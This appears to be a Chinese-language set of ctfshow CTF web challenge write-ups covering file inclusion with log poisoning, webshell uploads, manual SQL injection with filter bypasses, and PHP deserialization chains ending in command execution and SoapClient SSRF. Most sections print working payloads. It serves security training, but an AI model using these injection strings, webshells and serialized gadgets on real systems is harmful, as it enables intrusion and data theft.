payload:?file=PHP%3A//input,POST:<?php system("ls");?>

然后冒号被过滤了……说明php://input失效了

但还有日志可以用，?file=/var/log/nginx/access.log，发现它读取了很多的UA

那就在UA里面做手脚。抓包，UA插一句话木马，然后对着这个文件用AntSword，刀它！

在/var/www/html/fl0g.php中发现了flag

![](.\文件包含\图片\web81.png)



### web82

文件包含

**竞争环境需要晚上11点30分至次日7时30分之间做，其他时间不开放竞争条件**

嗯？竞争环境？

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 19:34:45
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/


if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
}
```

好吧，php和data被锁了，冒号和点号被封了。这下后门都上不了了。

根据题目提示，使用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含。

然而这题得熬夜做……今天就算了。







## php特性

## 文件上传

### web151

前台校验不可靠

那就改前端，按F12打开控制台。找到前端检查文件格式的地方，发现可以更改例外情况，那就把png改为php，上传一句话木马，然后AntSword连接即可。

![前端弱点](.\文件上传\web151\找到前端弱点.png)

在/var/www/html中找到flag.php，打开它得到flag。

![发现flag](.\文件上传\web151\得到flag.png)



### web152

后端不能单一校验

开局和web151一样的操作，先改前端使其能够上传php文件，然后发现它拒绝了，看来文件类型被人发现不对头了。

加个头试试？还是不合规。

那改变文件类型试试？想多了，文件类型改了就失效了。

看来必须得上传一个图片。

使用bp抓包，先将一句话木马改为png格式成功上传，抓包成功后然后修改回php的后缀解析在放包。

AntSword连接，成功

在/var/www/html里面找到了藏有flag的flag.php文件

![web152](.\文件上传\web152.png)



### web153（未完成）

## SQL注入

> 手动注入基本步骤：所有语句末尾接%23
>
> 1. 查询闭合条件:  空格/单引号/两个单引号…… ，测试到再度正常为止
> 2. 测试字段数：闭合 order by，查到异常到再度正常为止
> 3. 查回显字段：闭合 union select 所有段 查看结果
> 4. 爆库名：回显字段替换为database()
> 5. 爆表名：回显字段替换为group_concat(schema_name)，末尾接上from information_schema.schemata
> 6. 爆字段：回显字段替换为group_concat(table_name)，末尾接上from information_schema.tables where table_schema=database()
> 7. 爆对应字段的所有列的值：回显字段替换为group_concat(column_name),末尾接上 from information_schema.columns where table_name='字段名'
> 8. 爆对应列的对应值：回显字段替换为group_concat(所有想要的列)，末尾接上from 对应字段
>
> 

### web171

使用sqlmap是没有灵魂的，你在内涵谁？

等会儿就去Github上学习sqlmap的源代码，学会了再用这个，就有灵魂了（乐）。

```
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

入门的sql注入 这道题目其实就是最简单的sql注入的例子，这里会把输入的id以get的形式直接递交到后台和查询语句进行简单的字符串拼接的过程，同时根据这个题目的查询条件，可以猜测username为为flag的用户他的信息就是我们所需要的。

但是网页里所展示的24个用户并没有我们所需要的flag

这里主要的思路就是**用or进行截断，然后or后面跟我们所需要查询的语句**

'我们传入的语句'

首先我们给前面一个查询语句一个不可能达成的条件去截断它，即**-1'**

然后用or加上我们所要查询的 or username = 'flag'.我们语句外面还有一个引号。所以我们不要最后一个引号

最后的语句就是这样 -1' or username = 'flag

![](.\SQL注入\web171.png)

尝试使用sqlmap解决此题：

```
sqlmap -u "http://cde6efe9-40f8-430c-9698-5cdac62609b6.challenge.ctf.show/?id=1" --dbs --batch
```

想多了，别人把GET请求隔离了，专门放CSRF攻击的。



### web172

撸猫为主，要什么flag？

我就要！

进入环境，查看页面源码，发现select.js

看到查询时的url是/api/?id=

![](.\SQL注入\web172\完成注入.png)

先上手动注入流程：

1. 查看页面源码，发现select.js

   看到查询时的url是/api/?id=

   /api/?id=1' order by 3%23

   /api/?id=1' union select 1,2,3%23

   /api/?id=1' union select 1,2,database()%23

   联合查询

   /api/?id=1' union select 1,(select group_concat(schema_name) from information_schema.schemata),database()%23

   /api/?id=1' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='ctfshow_web'),database()%23

   /api/?id=1' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema='ctfshow_web' and table_name='ctfshow_user'),database()%23

   看到有3列 id,username,password

   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user),database()%23

   查询password发现没有flag

   查另一个表 ctfshow_user2

   /api/?id=1' union select 1,(select group_concat(password) from ctfshow_web.ctfshow_user2),database()%23

   看到flag

   ![](.\SQL注入\web172\完成注入.png)



### web173

考查sql基础

api/?id= 还是一如既往，开始手动注入

1. 闭合为1’
2. order by 检查有3段
3. 三段均可显示，nice
4. 数据库名：ctfshow_web
5. 表名：information_schema,test,mysql,performance_schema,ctfshow_web
6. ctfshow_web列名：ctfshow_user,ctfshow_user2,ctfshow_user3
7. ctfshow_user行名：没有
8. ctfshow_user2行名：没有
9. ctfshow_user3行名：id,username,password
10. ?id=1' union select id,username,password from ctfshow_user3%23，得到ctfshow{48d10635-f753-4e3a-bd14-b11b924dc67c}

![](.\SQL注入\web173.png)

### web174

本题过滤了一切带有数字的值回显出来，那就只能使用replace()语法将数字全部转换成字母来进行注入了

```
0' union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),"1","@A"),"2","@B"),"3","@C"),"4","@D"),"5","@E"),"6","@F"),"7","@G"),"8","@H"),"9","@I"),"0","@J") from ctfshow_user4 where username="flag" --+
```

但是，这样子会让flag也变成加密形式，因此需要写脚本还原

```
import base64

flag64 = "Y@CRmc@Bhvd@Cs@JYzcxYjRjYy@AmMjZkLTQ@BYjctYmU@JZS@AjYTMwMmFjZWU@EODZ@I"
flag = flag64.replace("@A", "1").replace("@B", "2").replace("@C", "3").replace("@D", "4").replace("@E", "5").replace(
    "@F", "6").replace("@G", "7").replace("@H", "8").replace("@I", "9").replace("@J", "0")

print(base64.b64decode(flag))
```

最后解码得到flag的值

![](.\SQL注入\web174\web174.png)



### web175

虽然正则匹配过滤了所有ASCII值的回显，但这并不意味着注入点不能看，毕竟无显示和异常还是有区别的。

然后关于不回显的事情，将内容输出到别的文件里访问就是了。

1. 测试发现1‘ 即可闭合代码
2. 经过order by测试，这次的数据库只有两段
3. 这都不需要测试回显了，就两行，图中有三行，怎么都显示。
4. 由于不回显，我们只能将其输出到另外的文件中查看，构造payload:1' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt'%23，也就是将查询的结果输出到/var/www/html/1.txt的文件中，待会儿我们访问便是。

这不就找到了吗？

![](.\SQL注入\web175.png)

### web176

从现在开始，有字符过滤了，开始学习绕过姿势。

过滤了`select`，通过大小写即可绕过 。order by检查有3行，那就开始吧。

直接构造payload:1' union SELect 1,2,3%23，很好三段均回显。

根据题目所给提示，直接

```
1' union sElect id,username,password from ctfshow_user%23
```

拿到flag

![](.\SQL注入\web176.png)

另解：万能密码'1 or 1=1%23



### web177

这次过滤了空格，/**/或者%09绕过即可。

order by试探了下只有三行，继续union select。

很好，这次没有过滤select。

那就直接把1，2，3换成id,username,password，最后接上%09from%09ctfshow_user%23

成功拿到flag。

![](.\SQL注入\web177.png)

p.s:尝试1‘%9or%091=1%23，失败……



### web178

过滤了空格和*号。

用%09绕过即可

```
1'%09union%09select%09id,username,password%09from%09ctfshow_user%23
```

完事，得到flag

再试试这个也可以

```
id=1'or'1'='1'%23
```

![](.\SQL注入\web178.png)

### web179

它这次把%09绕过了，那就用%0c代替

```
1'%0cunion%0cselect%0cid,username,password%0cfrom%0cctfshow_user%23
```

后面基本过程相似，就不放图了。

万能密码'or'1'='1'%23依旧坚挺，下道题试试看。

### web180

这次过滤了%09,%0a,%0b,%0d，用%0c绕过

通过测试发现注释符被过滤了，即–+，#，%23都不可以使用，我们换一种思路，把sql后面的‘闭合。

```
'or'1'='1'--%0c
```

或者

```
-1'%0cor%0cusername%0clike%0c'flag
```



## 反序列化

### web254

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        if($this->username===$u&&$this->password===$p){
            $this->isVip=true;
        }
        return $this->isVip;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = new ctfShowUser();
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

这题纯纯试水用的，当username = xxxxxx & password = xxxxxx时，文件打开flag.php告诉你flag是多少。

payload：?username=xxxxxx&password=xxxxxx

![](.\反序列化\图片\web254.png)



### web255

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            echo "your flag is ".$flag;
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}
```

又一次需要username和password的GET请求，然后对user的cookie进行反序列化，如果username 和password均为xxxxxx，同时

user的checkvip()通过(即user的isvip=true)，那就可以得到flag。

也就是说需要一个已经序列化好的user的cookie

先构造serialize.php：

```php
<?php
	class ctfShowUser{
    	public $isVip=true;
	}
	$a = new ctfShowUser();
	echo(urlencode(serialize($a)));

```

得到的值为O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D，这就是需要的cookie

使用BurpSuite重放

payload：?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A1%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D

请注意，使用BurpSuite时Cookie传递记得在Connection上面。

得到flag

![](.\反序列化\图片\web255.png)



### web256

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 19:29:02
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);
include('flag.php');

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;

    public function checkVip(){
        return $this->isVip;
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function vipOneKeyGetFlag(){
        if($this->isVip){
            global $flag;
            if($this->username!==$this->password){
                    echo "your flag is ".$flag;
              }
        }else{
            echo "no vip, no flag";
        }
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);    
    if($user->login($username,$password)){
        if($user->checkVip()){
            $user->vipOneKeyGetFlag();
        }
    }else{
        echo "no vip,no flag";
    }
}




```

多了一步对user的username和password的判断，要求不相等

构造序列化：

```
<?php
    class ctfShowUser
    {
        public $isVip = true;
        public $username='114514';
        public $password='1919810';
    }
    $user = new ctfShowUser();
    echo(urlencode(serialize($user)));
```

生成的序列化值为O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22114514%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%221919810%22%3B%7D

payload:?username=114514&password=1919810

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A8%3A%22username%22%3Bs%3A6%3A%22114514%22%3Bs%3A8%3A%22password%22%3Bs%3A7%3A%221919810%22%3B%7D

拿到flag

![](.\反序列化\图片\web256.png)



### web257

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 20:33:07
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    private $username='xxxxxx';
    private $password='xxxxxx';
    private $isVip=false;
    private $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    private $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    private $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    $user = unserialize($_COOKIE['user']);
    $user->login($username,$password);
}


```

首先读入username和password两个GET请求，然后还有一个叫user的cookie需要先序列化再输入。

注意__destruct()，它可以用来创建新的类，也就可以利用它来执行后门函数。

我们可以将class修改的值修改为一个backDoor对象，对backDoor类中的code属性进行赋值来达到rce

接下来进行判断：

首先user的username和password进入login()判断，这次只用存在即可

然后就没有然后了。

开始序列化：

```
<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
        $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    echo urlencode($a);
 
?>
```

序列化值为：O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

payload:?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

抓包执行后，已成功打开flag.php，查询源代码即可得到flag。

![](.\反序列化\图片\web257.png)



### web258

```
<?php

/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-12-02 17:44:47
# @Last Modified by:   h1xa
# @Last Modified time: 2020-12-02 21:38:56
# @email: h1xa@ctfer.com
# @link: https://ctfer.com

*/

error_reporting(0);
highlight_file(__FILE__);

class ctfShowUser{
    public $username='xxxxxx';
    public $password='xxxxxx';
    public $isVip=false;
    public $class = 'info';

    public function __construct(){
        $this->class=new info();
    }
    public function login($u,$p){
        return $this->username===$u&&$this->password===$p;
    }
    public function __destruct(){
        $this->class->getInfo();
    }

}

class info{
    public $user='xxxxxx';
    public function getInfo(){
        return $this->user;
    }
}

class backDoor{
    public $code;
    public function getInfo(){
        eval($this->code);
    }
}

$username=$_GET['username'];
$password=$_GET['password'];

if(isset($username) && isset($password)){
    if(!preg_match('/[oc]:\d+:/i', $_COOKIE['user'])){
        $user = unserialize($_COOKIE['user']);
    }
    $user->login($username,$password);
}



```

本题需要执行后门函数值得注意的是user序列化的值这次又正则过滤了，过滤内容为“O:”的集合。

绕过方法为在前面加上“+”号。

开始进行序列化：

```
<?php
    class ctfShowUser
    {
        public $username='xxxxxx';
        public $password='xxxxxx';
        public $isVip=true;
        public $class='backDoor';
 
        public function __construct()
        {
            $this->class=new backDoor();
        }
    }
    class backDoor
    {
        public $code='system("cat f*");';
        public function getInfo()
        {
            eval($this->code);
        }
    }
 
    $ctfShowUserObj = new ctfShowUser();
    $a = serialize($ctfShowUserObj);
    $a = str_replace('O:','O:+',$a);
    echo urlencode($a);
 
?>

```

得到的序列化值为:

O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

payload：?username=xxxxxx&password=xxxxxx

Cookie: user=O%3A%2B11%3A%22ctfShowUser%22%3A4%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3Bs%3A5%3A%22class%22%3BO%3A%2B8%3A%22backDoor%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A17%3A%22system%28%22cat+f%2A%22%29%3B%22%3B%7D%7D

执行完毕后在原网站查看源码即可得到flag。

![](.\反序列化\图片\web258.png)



### web259（未完成）

这次题目先给我们一个flag.php的源码:

```php
$xff = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
array_pop($xff);
$ip = array_pop($xff);


if($ip!=='127.0.0.1'){
	die('error');
}else{
	$token = $_POST['token'];
	if($token=='ctfshow'){
		file_put_contents('flag.txt',$flag);
	}
}
```

说明需要修改请求头的HTTP_X_FORWARDED_FOR为127.0.0.1，然后在接收一个token=ctfshow的POST请求才会打开flag.txt得到flag

先看一下靶机里面还有什么：

```
<?php

highlight_file(__FILE__);


$vip = unserialize($_GET['vip']);
//vip can get flag one key
$vip->getFlag();
```

说明先对vip的GET请求反序列化，然后将值传入getFlag()，问题是题目没告诉我们getFlag()是什么。

因此这题得使用php原生类进行反序列化攻击，考察函数为__call()，如何使用呢？**当调用不存在的时候，默认采用SoapClient的模式。**

开始构造序列化：

```
<?php
    $target = "http://127.0.0.1/flag.php"; // 通过所有的判断
    $post_string = "token=ctfshow";
    $b = new SoapClient(null,array('location' => $target,'user_agent'=>'wupco^^X-Forwarded-For:127.0.0.1,127.0.0.1^^Content-Type: application/x-www-form-urlencoded'.'^^Content-Length: '.(string)strlen($post_string).'^^^^'.$post_string,'uri'=> "ssrf"));
    $a = serialize($b);
    $a = str_replace('^^', "\r\n", $b);
    echo urlencode($a);
?>
```

*SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(SOAP 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用 __call 方法。下面我们一步步解释原理。*

由于是底层通讯协议，所以就不要拿这个代码去生成序列化了，将它传给服务器。

里面的换行我们用\r\n表示而不是\n\r。因为我们要以post方式提交一个参数token=ctfshow，所以**Content-Type: application/x-www-form-urlencoded并Content-Length: 13\r\n\r\ntoken=ctfshow** 。而这里的X-Forwarded-For:127.0.0.1,127.0.0.1,127.0.0.1是为了绕过那两次数组弹出元素。

用nc开启本地监听
